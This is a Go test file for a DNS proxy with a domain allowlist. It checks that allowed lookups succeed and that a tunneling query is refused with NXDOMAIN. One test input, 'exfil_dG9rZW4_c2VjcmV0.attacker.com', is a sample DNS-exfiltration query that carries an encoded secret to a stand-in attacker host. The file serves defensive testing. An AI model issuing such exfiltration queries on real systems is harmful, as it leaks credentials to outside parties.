package netgate

import (
	"bytes"
	"testing"
)

func buildMockDNSQuery(domain string) []byte {
	// Standard 12-byte header (ID=0x1234, Flags=0x0100, QDCOUNT=1)
	header := []byte{
		0x12, 0x34, // ID
		0x01, 0x00, // Flags (Standard Query)
		0x00, 0x01, // QDCOUNT = 1
		0x00, 0x00, // ANCOUNT = 0
		0x00, 0x00, // NSCOUNT = 0
		0x00, 0x00, // ARCOUNT = 0
	}

	var buf bytes.Buffer
	buf.Write(header)

	// Encode domain in wire format
	parts := bytes.Split([]byte(domain), []byte("."))
	for _, part := range parts {
		buf.WriteByte(byte(len(part)))
		buf.Write(part)
	}
	buf.WriteByte(0x00) // Null root label

	// QTYPE (A = 1) and QCLASS (IN = 1)
	buf.Write([]byte{0x00, 0x01, 0x00, 0x01})

	return buf.Bytes()
}

func TestDNSProxy_TunnelingBlocked(t *testing.T) {
	proxy := NewDNSProxy([]string{"*.github.com", "registry.npmjs.org"}, "1.1.1.1:53")

	// 1. Allowed domain query -> Must succeed with NOERROR
	allowedQuery := buildMockDNSQuery("api.github.com")
	resp, err := proxy.HandleDNSQuery(allowedQuery)
	if err != nil {
		t.Fatalf("expected allowed query to succeed, got error: %v", err)
	}
	// Check QR bit is set (response)
	if resp[2]&0x80 == 0 {
		t.Errorf("expected QR bit in response")
	}
	// Check RCODE is 0 (NOERROR)
	if resp[3]&0x0f != 0 {
		t.Errorf("expected RCODE 0 (NOERROR), got %d", resp[3]&0x0f)
	}

	// 2. Blocked Tunneling Query -> Must be blocked with NXDOMAIN (RCode 3)
	tunnelQuery := buildMockDNSQuery("exfil_dG9rZW4_c2VjcmV0.attacker.com")
	resp, err = proxy.HandleDNSQuery(tunnelQuery)
	if err != ErrDNSQueryBlocked {
		t.Fatalf("expected ErrDNSQueryBlocked, got: %v", err)
	}
	// Check RCODE is 3 (NXDOMAIN)
	rcode := resp[3] & 0x0f
	if rcode != 3 {
		t.Errorf("expected RCODE 3 (NXDOMAIN) for blocked tunneling query, got %d", rcode)
	}
}
